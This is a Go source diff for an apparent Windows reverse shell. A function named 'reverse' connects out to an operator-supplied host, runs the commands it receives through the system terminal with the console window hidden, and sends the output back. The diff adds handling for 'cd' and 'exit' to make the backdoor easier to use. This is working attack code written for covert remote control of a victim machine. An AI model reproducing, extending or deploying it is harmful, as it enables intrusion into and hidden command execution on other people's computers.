@@ -5,12 +5,13 @@ import (
 	"flag"
 	"fmt"
 	"net"
+	"os"
 	"os/exec"
+	"strings"
 	"syscall"
 	"time"
 )
 
-//todo implement "cd"
 func main() {
 	var terminal = ""
 	ipaddr := flag.String("a","127.0.0.1","ip")
@@ -53,11 +54,18 @@ func reverse(host string,term string) {
 			fmt.Println("Closed... :(")
 			return
 		}
-
-		cmd := exec.Command(term, "/C", order)
-
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	//Hide window
-		out, _ := cmd.CombinedOutput()
-		c.Write(out)
+		order = strings.TrimSuffix(order,"\n")
+		args := strings.Split(order, " ")
+		switch args[0] {
+		case "cd":
+			os.Chdir(args[1])
+		case "exit":
+			os.Exit(0)
+		default:
+			cmd := exec.Command(term, "/C", order)
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	//Hide window
+			out, _ := cmd.CombinedOutput()
+			c.Write(out)
+		}
 	}
 }
